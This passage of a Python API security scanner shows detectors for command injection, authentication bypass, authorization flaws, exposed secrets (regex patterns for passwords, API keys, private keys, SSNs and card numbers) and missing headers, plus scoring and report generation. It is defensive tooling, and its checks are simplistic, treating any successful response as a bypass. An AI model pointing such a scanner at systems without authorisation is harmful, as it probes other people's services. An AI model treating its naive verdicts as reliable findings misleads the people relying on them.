                    severity=VulnerabilitySeverity.CRITICAL,
                    endpoint=test.target_endpoint.path,
                    method=test.target_endpoint.method,
                    payload=test.test_payloads[0] if test.test_payloads else None,
                    description=f"Command injection vulnerability detected: {pattern}",
                    impact="Potential remote code execution and system compromise",
                    remediation="Avoid system calls with user input, use safe APIs",
                    evidence={"command_output": pattern},
                    cvss_score=9.5,
                    cwe_id="CWE-78",
                    owasp_category=self.owasp_mapping["injection"]
                ))
                break
        
        return vulnerabilities

    def _detect_auth_bypass(self, test: APISecurityTest,
                          response: aiohttp.ClientResponse,
                          response_body: str) -> List[APIVulnerability]:
        """Detect authentication bypass vulnerabilities"""
        vulnerabilities = []
        
        # Check if request succeeded without authentication when it should have failed
        if response.status == 200 and test.target_endpoint.authentication_required:
            vulnerabilities.append(APIVulnerability(
                vulnerability_id=f"auth_bypass_{test.test_id}",
                vulnerability_type=APIVulnerabilityType.HEADER_INJECTION,  # Closest match
                severity=VulnerabilitySeverity.CRITICAL,
                endpoint=test.target_endpoint.path,
                method=test.target_endpoint.method,
                description="Authentication bypass - endpoint accessible without authentication",
                impact="Unauthorized access to protected resources",
                remediation="Implement proper authentication checks",
                evidence={"status_code": response.status, "should_require_auth": True},
                cvss_score=9.0,
                cwe_id="CWE-287",
                owasp_category=self.owasp_mapping["broken_user_authentication"]
            ))
        
        return vulnerabilities

    def _detect_authz_flaws(self, test: APISecurityTest,
                          response: aiohttp.ClientResponse,
                          response_body: str) -> List[APIVulnerability]:
        """Detect authorization flaws"""
        vulnerabilities = []
        
        # Check for privilege escalation
        if response.status == 200 and test.target_endpoint.authorization_roles:
            vulnerabilities.append(APIVulnerability(
                vulnerability_id=f"privilege_escalation_{test.test_id}",
                vulnerability_type=APIVulnerabilityType.HEADER_INJECTION,  # Closest match
                severity=VulnerabilitySeverity.HIGH,
                endpoint=test.target_endpoint.path,
                method=test.target_endpoint.method,
                description="Privilege escalation - insufficient authorization checks",
                impact="Unauthorized access to privileged functions",
                remediation="Implement proper role-based access controls",
                evidence={"required_roles": test.target_endpoint.authorization_roles},
                cvss_score=8.0,
                cwe_id="CWE-863",
                owasp_category=self.owasp_mapping["broken_function_authorization"]
            ))
        
        return vulnerabilities

    def _detect_sensitive_data_exposure(self, test: APISecurityTest,
                                      response_body: str) -> List[APIVulnerability]:
        """Detect sensitive data exposure"""
        vulnerabilities = []
        
        # Patterns for sensitive data
        sensitive_patterns = {
            "password": r"['\"]?password['\"]?\s*:\s*['\"]([^'\"]+)['\"]",
            "api_key": r"['\"]?api[_-]?key['\"]?\s*:\s*['\"]([^'\"]+)['\"]",
            "secret": r"['\"]?secret['\"]?\s*:\s*['\"]([^'\"]+)['\"]",
            "token": r"['\"]?token['\"]?\s*:\s*['\"]([^'\"]+)['\"]",
            "private_key": r"-----BEGIN (RSA )?PRIVATE KEY-----",
            "email": r"\b[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Z|a-z]{2,}\b",
            "ssn": r"\b\d{3}-\d{2}-\d{4}\b",
            "credit_card": r"\b(?:\d{4}[-\s]?){3}\d{4}\b"
        }
        
        for data_type, pattern in sensitive_patterns.items():
            if re.search(pattern, response_body, re.IGNORECASE):
                vulnerabilities.append(APIVulnerability(
                    vulnerability_id=f"sensitive_data_{data_type}_{test.test_id}",
                    vulnerability_type=APIVulnerabilityType.RESPONSE_SPLITTING,  # Closest match
                    severity=VulnerabilitySeverity.MEDIUM,
                    endpoint=test.target_endpoint.path,
                    method=test.target_endpoint.method,
                    description=f"Sensitive data exposure: {data_type} found in response",
                    impact="Information disclosure of sensitive data",
                    remediation="Remove sensitive data from API responses",
                    evidence={"data_type": data_type, "pattern_matched": True},
                    cvss_score=5.0,
                    cwe_id="CWE-200",
                    owasp_category=self.owasp_mapping["excessive_data_exposure"]
                ))
        
        return vulnerabilities

    def _detect_security_misconfigurations(self, test: APISecurityTest,
                                         response: aiohttp.ClientResponse) -> List[APIVulnerability]:
        """Detect security misconfigurations"""
        vulnerabilities = []
        
        # Check for missing security headers
        required_headers = {
            "X-Content-Type-Options": "nosniff",
            "X-Frame-Options": ["DENY", "SAMEORIGIN"],
            "X-XSS-Protection": "1; mode=block",
            "Strict-Transport-Security": None,  # Any value is good
            "Content-Security-Policy": None
        }
        
        for header, expected_value in required_headers.items():
            if header not in response.headers:
                vulnerabilities.append(APIVulnerability(
                    vulnerability_id=f"missing_header_{header}_{test.test_id}",
                    vulnerability_type=APIVulnerabilityType.HEADER_INJECTION,
                    severity=VulnerabilitySeverity.LOW,
                    endpoint=test.target_endpoint.path,
                    method=test.target_endpoint.method,
                    description=f"Missing security header: {header}",
                    impact="Potential security vulnerability due to missing protection",
                    remediation=f"Add {header} security header",
                    evidence={"missing_header": header},
                    cvss_score=3.0,
                    cwe_id="CWE-16",
                    owasp_category=self.owasp_mapping["security_misconfiguration"]
                ))
        
        # Check for information disclosure in headers
        server_header = response.headers.get('Server', '')
        if server_header and any(keyword in server_header.lower() for keyword in ['apache/', 'nginx/', 'iis/']):
            vulnerabilities.append(APIVulnerability(
                vulnerability_id=f"server_disclosure_{test.test_id}",
                vulnerability_type=APIVulnerabilityType.HEADER_INJECTION,
                severity=VulnerabilitySeverity.INFO,
                endpoint=test.target_endpoint.path,
                method=test.target_endpoint.method,
                description="Server information disclosure in headers",
                impact="Information disclosure about server technology",
                remediation="Remove or obfuscate server header",
                evidence={"server_header": server_header},
                cvss_score=1.0,
                cwe_id="CWE-200"
            ))
        
        return vulnerabilities

    async def _generate_security_report(self, scan_id: str, base_url: str,
                                       test_results: List[APISecurityResult],
                                       scan_duration: float) -> APISecurityReport:
        """Generate comprehensive API security report"""
        
        # Collect all vulnerabilities
        all_vulnerabilities = []
        for result in test_results:
            all_vulnerabilities.extend(result.vulnerabilities)
        
        # Count vulnerabilities by severity
        vulnerability_counts = {
            "critical": len([v for v in all_vulnerabilities if v.severity == VulnerabilitySeverity.CRITICAL]),
            "high": len([v for v in all_vulnerabilities if v.severity == VulnerabilitySeverity.HIGH]),
            "medium": len([v for v in all_vulnerabilities if v.severity == VulnerabilitySeverity.MEDIUM]),
            "low": len([v for v in all_vulnerabilities if v.severity == VulnerabilitySeverity.LOW]),
            "info": len([v for v in all_vulnerabilities if v.severity == VulnerabilitySeverity.INFO])
        }
        
        # Calculate security score
        security_score = self._calculate_security_score(all_vulnerabilities)
        
        # Calculate OWASP API compliance
        owasp_compliance = self._calculate_owasp_compliance(all_vulnerabilities)
        
        # Generate vulnerability summary
        vuln_summary = self._generate_vulnerability_summary(all_vulnerabilities)
        
        # Generate recommendations
        recommendations = self._generate_security_recommendations(all_vulnerabilities, test_results)
        
        return APISecurityReport(
            scan_id=scan_id,
            target_base_url=base_url,
            scan_timestamp=datetime.utcnow(),
            total_endpoints=len(self.discovered_endpoints),
            tested_endpoints=len(set(r.test.target_endpoint.path for r in test_results)),
            total_tests=len(test_results),
            completed_tests=len([r for r in test_results if r.error_message is None]),
            vulnerabilities_found=len(all_vulnerabilities),
            critical_vulnerabilities=vulnerability_counts["critical"],
            high_vulnerabilities=vulnerability_counts["high"],
            medium_vulnerabilities=vulnerability_counts["medium"],
            low_vulnerabilities=vulnerability_counts["low"],
            security_score=security_score,
            owasp_api_compliance=owasp_compliance,
            test_results=test_results,
            vulnerability_summary=vuln_summary,
            recommendations=recommendations,
            scan_duration=scan_duration
        )

    def _calculate_security_score(self, vulnerabilities: List[APIVulnerability]) -> float:
        """Calculate overall security score"""
        if not vulnerabilities:
            return 100.0
        
        # Weight vulnerabilities by severity
        severity_weights = {
            VulnerabilitySeverity.CRITICAL: 25,
            VulnerabilitySeverity.HIGH: 15,
            VulnerabilitySeverity.MEDIUM: 8,
            VulnerabilitySeverity.LOW: 3,
            VulnerabilitySeverity.INFO: 1
        }
        
        total_penalty = sum(severity_weights.get(v.severity, 0) for v in vulnerabilities)
        
        # Calculate score (max penalty caps at 100)
        score = max(0, 100 - min(100, total_penalty))
        return score

    def _calculate_owasp_compliance(self, vulnerabilities: List[APIVulnerability]) -> float:
        """Calculate OWASP API Security Top 10 compliance"""
        owasp_categories = set(self.owasp_mapping.values())
        vulnerable_categories = set()
        
        for vuln in vulnerabilities:
            if vuln.owasp_category:
                vulnerable_categories.add(vuln.owasp_category)
        
        compliant_categories = len(owasp_categories) - len(vulnerable_categories)
        compliance_percentage = (compliant_categories / len(owasp_categories)) * 100
        
        return compliance_percentage

    def _generate_vulnerability_summary(self, vulnerabilities: List[APIVulnerability]) -> Dict[str, int]:
        """Generate vulnerability summary by type"""
        summary = {}
        
        for vuln in vulnerabilities:
            vuln_type = vuln.vulnerability_type.value
            summary[vuln_type] = summary.get(vuln_type, 0) + 1
        
        return summary

    def _generate_security_recommendations(self, vulnerabilities: List[APIVulnerability],
                                         test_results: List[APISecurityResult]) -> List[str]:
        """Generate security recommendations"""
        recommendations = []
        
        # Critical vulnerability recommendations
        critical_vulns = [v for v in vulnerabilities if v.severity == VulnerabilitySeverity.CRITICAL]
        if critical_vulns:
            recommendations.append(f"Immediately address {len(critical_vulns)} critical vulnerabilities")
        
        # Injection vulnerability recommendations
        injection_vulns = [v for v in vulnerabilities if "injection" in v.vulnerability_type.value]
        if injection_vulns:
            recommendations.append("Implement parameterized queries and input validation to prevent injection attacks")
        
        # Authentication recommendations
        auth_vulns = [v for v in vulnerabilities if any(keyword in v.description.lower() 
                     for keyword in ["authentication", "authorization", "bypass"])]
        if auth_vulns:
            recommendations.append("Strengthen authentication and authorization mechanisms")
        
        # Security headers recommendations
        header_vulns = [v for v in vulnerabilities if "header" in v.description.lower()]
        if header_vulns:
            recommendations.append("Implement security headers to protect against common attacks")
        
        # General recommendations
        if len(vulnerabilities) > 10:
            recommendations.append("Conduct regular security assessments and implement security testing in CI/CD")
        
        # OWASP compliance
        owasp_compliance = self._calculate_owasp_compliance(vulnerabilities)
        if owasp_compliance < 80:
            recommendations.append("Review and implement OWASP API Security Top 10 guidelines")
        
        return recommendations

    def generate_report(self, report: APISecurityReport, format: str = "markdown") -> str:
        """Generate API security report in specified format"""
        if format == "json":
            return self._generate_json_report(report)
        elif format == "markdown":
            return self._generate_markdown_report(report)
        else:
            raise ValueError(f"Unsupported format: {format}")

    def _generate_json_report(self, report: APISecurityReport) -> str:
        """Generate JSON report"""
        # Convert to serializable format
        data = {
            "scan_id": report.scan_id,
            "target": report.target_base_url,
            "timestamp": report.scan_timestamp.isoformat(),
            "summary": {
                "security_score": report.security_score,
                "owasp_compliance": report.owasp_api_compliance,
                "total_vulnerabilities": report.vulnerabilities_found,
                "critical": report.critical_vulnerabilities,
                "high": report.high_vulnerabilities,
                "medium": report.medium_vulnerabilities,
                "low": report.low_vulnerabilities
            },
            "test_summary": {
                "total_tests": report.total_tests,
                "completed_tests": report.completed_tests,
                "total_endpoints": report.total_endpoints,
                "tested_endpoints": report.tested_endpoints
            },
            "vulnerability_summary": report.vulnerability_summary,
            "recommendations": report.recommendations
        }
        
        return json.dumps(data, indent=2)

    def _generate_markdown_report(self, report: APISecurityReport) -> str:
        """Generate Markdown report"""
        
        # Determine security status
        if report.security_score >= 90:
            status_emoji = "🟢"
            status_text = "Secure"
        elif report.security_score >= 70:
            status_emoji = "🟡"
            status_text = "Moderate Risk"
        elif report.security_score >= 50:
            status_emoji = "🟠"
            status_text = "High Risk"
        else:
            status_emoji = "🔴"
            status_text = "Critical Risk"
        
        md = f"""# API Security Scan Report {status_emoji}

**Scan ID:** {report.scan_id}  
**Target:** {report.target_base_url}  
**Generated:** {report.scan_timestamp.strftime('%Y-%m-%d %H:%M:%S')}  
**Security Score:** {report.security_score:.1f}/100 ({status_text})  
**OWASP API Compliance:** {report.owasp_api_compliance:.1f}%

## Summary

| Metric | Value |
|--------|-------|
| Total Endpoints | {report.total_endpoints} |
| Tested Endpoints | {report.tested_endpoints} |
| Total Tests | {report.total_tests} |
| Vulnerabilities Found | {report.vulnerabilities_found} |
| Scan Duration | {report.scan_duration:.2f}s |

## Vulnerability Breakdown

| Severity | Count |
|----------|-------|
| 🔴 Critical | {report.critical_vulnerabilities} |
| 🟠 High | {report.high_vulnerabilities} |
| 🟡 Medium | {report.medium_vulnerabilities} |
| 🔵 Low | {report.low_vulnerabilities} |

## Vulnerability Types

"""
        
        for vuln_type, count in report.vulnerability_summary.items():
            md += f"- **{vuln_type.replace('_', ' ').title()}**: {count}\n"
        
        if report.recommendations:
            md += "\n## Recommendations\n\n"
            for i, rec in enumerate(report.recommendations, 1):
                md += f"{i}. {rec}\n"
        
        return md

# Global API security scanner instance
api_security_scanner = APISecurityScanner()

__all__ = [
    "APISecurityScanner",
    "APIEndpoint",
    "APISecurityTest",
    "APISecurityResult",
    "APIVulnerability",
    "APISecurityReport",
    "APISecurityTestType",
    "APIVulnerabilityType",
    "VulnerabilitySeverity",
    "api_security_scanner"
]